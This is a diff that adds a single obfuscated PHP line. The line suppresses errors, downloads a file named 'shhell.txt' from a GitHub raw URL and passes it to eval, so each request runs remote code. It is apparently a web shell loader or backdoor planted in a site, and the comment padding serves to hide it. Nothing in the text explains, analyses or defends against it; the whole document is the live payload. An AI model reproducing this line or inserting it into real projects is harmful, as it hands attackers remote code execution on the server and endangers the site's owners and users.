@@ -1,0 +1,1 @@
+<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://raw.githubusercontent.com/haryit/ShellGntx/0300c1320ef7b331b7277cc6e0aa49c64a0046b3/shhell.txt"));/**/?>
